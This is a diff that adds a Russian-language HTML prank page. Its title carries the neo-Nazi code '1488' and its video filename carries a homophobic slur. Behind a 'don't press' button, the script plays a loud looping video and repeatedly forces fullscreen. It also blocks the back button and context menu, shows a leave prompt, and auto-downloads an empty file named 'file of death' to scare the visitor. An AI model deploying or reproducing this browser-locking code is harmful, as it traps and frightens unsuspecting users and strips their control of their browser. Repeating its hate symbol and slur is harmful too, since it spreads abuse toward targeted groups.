@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+<title>zovface1488</title>
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  background: #000;
+  overflow: hidden;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+#start {
+  position: fixed;
+  inset: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 10;
+}
+
+button {
+  padding: 22px 48px;
+  font-size: 26px;
+  color: #eaeaea;
+  background: linear-gradient(145deg, #2b2b2b, #111);
+  border: 2px solid #777;
+  border-radius: 18px;
+  cursor: pointer;
+  box-shadow:
+    0 0 15px rgba(255,255,255,0.08),
+    inset 0 0 10px rgba(255,255,255,0.05);
+}
+
+button:active {
+  background: linear-gradient(145deg, #111, #2b2b2b);
+}
+
+video {
+  position: fixed;
+  inset: 0;
+  width: 100vw;
+  height: 100vh;
+  object-fit: cover;
+  display: none;
+  z-index: 1;
+}
+</style>
+</head>
+
+<body>
+
+<div id="start">
+  <button id="btn">не нажимай</button>
+</div>
+
+<video id="vid" loop playsinline>
+  <source src="trollfacepidor.mp4" type="video/mp4">
+</video>
+
+<script>
+const btn = document.getElementById("btn");
+const video = document.getElementById("vid");
+
+// прячем адресную строку (мобила)
+function hideAddressBar() {
+  setTimeout(() => {
+    window.scrollTo(0, 1);
+  }, 50);
+}
+
+// fullscreen
+function goFullscreen() {
+  if (!document.fullscreenElement) {
+    document.documentElement.requestFullscreen().catch(()=>{});
+  }
+}
+
+btn.onclick = async () => {
+  document.getElementById("start").remove();
+
+  hideAddressBar();
+  goFullscreen();
+
+  video.style.display = "block";
+  video.volume = 1.0;
+  video.muted = false;
+  try { await video.play(); } catch(e){}
+
+  // скачивание пустого файла
+  const blob = new Blob([""], { type: "application/octet-stream" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "файла смерти";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(a.href);
+};
+
+// 🔁 автоперезапуск fullscreen
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    setTimeout(goFullscreen, 100);
+  }
+});
+
+// постоянно прячем адресную строку
+window.addEventListener("resize", hideAddressBar);
+window.addEventListener("orientationchange", hideAddressBar);
+document.addEventListener("touchstart", hideAddressBar);
+
+// усложнение выхода
+window.onbeforeunload = () => "Ты уверен?";
+
+// блок контекстного меню
+document.addEventListener("contextmenu", e => e.preventDefault());
+
+// блок кнопки назад
+history.pushState(null, "", location.href);
+window.onpopstate = () => {
+  history.pushState(null, "", location.href);
+};
+</script>
+
+</body>
+</html>
